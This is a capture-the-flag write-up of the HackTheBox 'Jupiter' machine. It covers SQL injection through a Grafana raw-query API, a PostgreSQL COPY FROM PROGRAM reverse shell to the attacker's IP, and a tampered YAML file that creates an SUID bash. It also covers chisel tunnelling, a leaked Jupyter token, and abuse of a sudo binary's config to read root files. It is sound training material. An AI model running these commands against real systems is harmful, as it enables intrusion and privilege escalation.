![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8ac57302-e9c8-4adf-8341-59ba70a35555)

https://app.hackthebox.com/machines/Jupiter

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I initiated the enumeration process by conducting a swift rustscan, which unveiled the availability of two open ports: 22 and 80.

```bash
sudo rustscan -a 10.10.11.216 -- -sC -sV -vv -oN jupiter_nmap
```
The rustscan output indicated that port 22 was open for SSH and port 80 was accessible for HTTP. A more in-depth analysis of the service versions was performed:

```Rust
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEJSyKmXs5CCnonRCBuHkCBcdQ54oZCUcnlsey3u2/vMXACoH79dGbOmIHBTG7/GmSI/j031yFmdOL+652mKGUI=
|   256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHhClp0ailXIfO0/6yw9M1pRcZ0ZeOmPx22sO476W4lQ
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Upon inspecting the scan results, I noted the presence of the domain "jupiter.htb". This information was promptly added to my host configuration file to ensure seamless access.

With the domain configuration in place, I proceeded to explore the domain through web browsing, revealing that the platform offered services related to "Solar observations".

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0261b028-311c-486f-874a-3542c37b9588)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Fuzzing:

Continuing with the investigation, I proceeded to conduct vhost and sub-directory enumeration. These scans yielded valuable insights.

For sub-directory enumeration, the following command was employed:
```bash
gobuster dir -u http://jupiter.htb/ -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -e -b 404,403,400 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a97ea7d3-be29-4b8b-8373-d1e644721950)

During the vhost enumeration, I identified another sub-domain, namely "kiosk".

```bash
ffuf -H "Host: FUZZ.jupiter.htb" -u http://10.10.11.216 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/fd7f208a-5a97-4f2c-b825-a3e1484e0ac4)

Incorporating this newly discovered sub-domain into my host configuration file, I proceeded to explore it. After inspecting the content, I realized that it was a dashboard presenting information about planets and their moons. This interface was operating on the **Grafana** application:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f9ef7d12-adb7-4589-ab68-1cfd78752b6d)

Attempting to identify potential vulnerabilities, I checked the version of Grafana. To my disappointment, it was the latest version, and no known vulnerabilities were associated with it. 😕

Subsequently, I performed sub-directory enumeration, yielding results that didn't seem particularly significant:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a0d7f05c-2d2f-4efe-9120-d9ed9e69d11d)

To delve deeper into the situation, I activated Burp Suite to inspect requests and responses. Through this examination, I discovered that the application was communicating via an API request:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/bb00b393-e9ac-405b-a384-fcf0aeb9482c)

Further analysis of one of these requests in the repeater tab unveiled that the API was retrieving data from a PostgreSQL database through a raw SQL query:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/76ae6a25-5a07-40b5-b865-c793482ca0a2)

To determine if this setup was vulnerable to SQL injection (SQLI), I conducted a basic query to identify the version of the PostgreSQL database:

```sql
SELECT version()
```

Replacing the existing raw query with my query, I executed it and received a response that revealed the version of the PostgreSQL DB. This confirmed the presence of SQLI vulnerability. 🙂

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/31742498-6386-4a9d-9a97-496026d6a012)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

After confirming the vulnerability in the raw query parameter, I delved into finding ways to extract data from the vulnerable database. My search led me to a [blog](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767) that outlined a method to execute commands and gain a shell through the PostgreSQL COPY command.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ee08db2b-6c6c-40a5-a184-d41682996ba1)

Following the instructions provided in the blog, I initiated the process by creating a table named "cmd_shell":

```sql
CREATE TABLE cmd_shell(output text);
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d2639b5-4289-4bb7-a482-4a8564da63f1)

With the table successfully created, I proceeded to utilize the PROGRAM parameter to execute a shell command, effectively initiating a connection to my netcat listener:

```sql
COPY cmd_shell FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.128/53 0>&1\"'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e43c89f6-ea05-4b96-ab18-9d3b0ab648c4)

Despite encountering a 504 error in the response, I received a connection in my netcat listener, achieving a shell as the "postgres" user:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0f67d88d-8049-422c-a453-983261f7e5bc)

With initial access achieved, my next objective was to obtain the user flag, which I currently lacked the necessary privileges to access.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## User.txt:

Upon examining the home directory, two users stood out: Jovian and Juno. However, I lacked the required permissions to access the directories of either user. To overcome this limitation, I performed manual enumeration and uploaded the PSPY binary to monitor running processes.

While executing as the "postgres" user, whose UID was 114, I shifted my focus to the user with UID 1000, Juno:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/77c13e35-9dca-4578-9d29-639a47099def)

As the PSPY binary ran, my attention was drawn to a file named "**network-simulation.yml**," executing with Juno's privileges from the path /dev/shm:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9ba76068-1e49-4253-90a0-811d13dc82ab)

Although I had read and write privileges for the file, its execution permission was lacking. However, I noticed it was invoked by a parent file "/bin/bash /home/juno/shadow-simulation.sh":

Upon examining the contents of the YAML file, I found:

```YAML
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

Attempting to modify commands, I substituted the python3 binary to establish a reverse shell. Unfortunately, this approach didn't yield the desired results.

Subsequently, I created a network-simulation.yml file on my Kali host, crafting a command to copy and assign SUID permissions to the bash binary:

```YAML
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```

By hosting this altered file and employing wget -O option, I replaced the original network-simulation.yml on the victim's system:

```bash
wget http://my-ip/network-simulation.yml -O network-simulation.yml #this replaced the originla file with my file.
```

Executing this modified file yielded a bash binary with Juno's privileges in the /tmp directory. I executed this binary and successfully obtained a shell as "Juno":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/844400c6-3f6f-4619-95a1-d50bccef3ec4)

Although I now had access to Juno's account, I still lacked the required permissions to read the user flag:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a7204f90-f014-4225-9e42-1ff5f1c2f2c6)

So, to mitigate this issue I created a SSH key pair & dropped the public key into Juno "authorized key" folder:

```bash
ssh-keygen
```
To address this issue, I generated an SSH key pair, placed the public key in Juno's "authorized_keys" folder, and leveraged my private key to SSH into Juno's account. This final step allowed me to access the user flag. (Pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c0ffd53e-d3b7-4b88-886a-00db416007d8)

### method 2:

Following a short break, I discovered that my write access to the SSH authorized keys had been revoked after the machine restart. This posed a new challenge in gaining access to Juno's account. As a result, my approach shifted towards leveraging the "shadow-simulation.sh" script to run a bash reverse shell under Juno's privileges.

To execute the bash reverse shell, I augmented the "shadow-simulation.sh" script by appending a bash one-liner at the end:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c6c8ca7b-745b-4124-9cce-6c7a49336ec4)

Running the scheduled script once more provided me with access to Juno's account, thus enabling me to proceed with my exploration.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/78647cba-51fe-4f13-9fe5-4f11999e0a51)


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Lateral movement:

Having secured the user flag from Juno, my attention shifted towards Jovian. To ascertain any processes running under Jovian's privileges (UID = 1001), I re-executed pspy. There, I stumbled upon a machine learning script executed via Jupyter notebook, located at the path: "**/opt/solar-flares/flares.ipynb**".

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/63d1b8ac-788f-4a8c-bd01-0a76efa5876f)

Given that the process employed Jupyter notebook, which typically runs on port 8888, I verified its status using the netstat command. My examination confirmed that port 8888 was indeed active.

```bash
netstat -tunlp
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/fc452ca7-68cb-42af-a150-a4953690dca0)

### Port forwarding:

To access the service on port 8888, which is not directly accessible from outside, I employed port forwarding. This process involved using chisel to redirect all the traffic from the Jupiter box to my Kali host.

```bash
./chisel_kill3r server --reverse -socks5 -p 8001 #on my kali host

./chisel client 10.10.14.118:8001 R:socks #on the target host
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ec52030d-c5ad-40a0-a612-e80d277c9de8)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d6e930a2-805c-48f5-a34f-b6780acc7367)

Having established port forwarding and routed the traffic through a SOCKS5 proxy on port 1080, I accessed the webpage on port 8888, revealing the need for either a token or password for authentication.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/43e98f92-05be-477f-9da2-c05c073e754e)

A review of the pspy results had indicated the script's operation from the "/opt/solar-flares/" directory. Upon examining this directory, I discovered a "log" folder containing log files. One of these logs revealed a token.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e948114b-9671-46e8-87ae-017e51f99bd6)

Using this token, I successfully accessed the Jupyter notebook:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/50a8539d-ce9b-477a-9b00-4edfab67a38a)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Root flag:

Within the Jupyter application, after accessing the "flares.ipynb" notebook, I encountered several Python/ML scripts.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4de58f13-7946-42e9-add1-87b271cdde77)

I added another Python script to create a reverse shell connection to my Kali host within this notebook and executed it.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/fa8fe140-9655-4240-9579-e687cff26890)

Executing the script provided me with a reverse shell as Jovian.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7fd19192-1fbc-4f66-a697-d18e33ccf893)

Upon examining Jovian's sudo permissions, I noted that Jovian can execute the following command without requiring a password as a sudo user:

```
/usr/local/bin/sattrack
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ce44577f-0652-4294-8851-fb0b16245646)

Executing the binary using sudo privileges revealed a satellite tracking system seeking a configuration file.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5c6fc183-0b0a-4302-980a-f32ba8bb725b)

The strings command, used in combination with grep, revealed that the binary was searching for the "config.json" file in the "/tmp" directory.

```bash
strings /usr/local/bin/sattrack  | grep -i "config"
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/86080985-cc77-4179-8009-56557111aa06)


Despite not finding the "config.json" file in the "/tmp" directory, a search using the find command located it in another location.

```bash
find / -name 'config.json' 2>/dev/null

#/usr/local/share/sattrack/config.json
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5aa05b76-7c90-4648-a3ea-4f85c5027986)

Copying this file to the temporary directory allowed me to examine its contents.

```bash
cp /usr/local/share/sattrack/config.json /tmp/config.json
```

Once the file was copied, I altered the content of "config.json" to retrieve the root flag, as the configuration file fetched data from URLs.

```json
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "file:///root/root.txt"  #replaced the URLs & added this line fetch the root flag
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

With these modifications in place, I executed the sattrack command again and successfully retrieved the root flag.(pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6f6449ae-32c0-4f1c-a17e-2b9695a4fc7e)
